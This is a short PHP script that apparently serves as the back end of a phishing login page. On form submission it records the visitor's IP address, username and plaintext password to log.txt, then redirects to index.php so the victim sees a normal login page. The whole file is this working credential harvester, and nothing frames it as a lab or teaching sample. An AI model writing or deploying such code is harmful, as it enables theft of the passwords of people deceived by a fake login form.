<?php
// Function to get the user's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Log the IP, username, and password when the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ip = getUserIP();
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the IP, username, and password to a file
    $logData = "IP: " . $ip . " | Username: " . $username . " | Password: " . $password . " | Submitted: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents('log.txt', $logData, FILE_APPEND);

    // Redirect to the login page after logging
    header("Location: index.php");
    exit();
}
?>
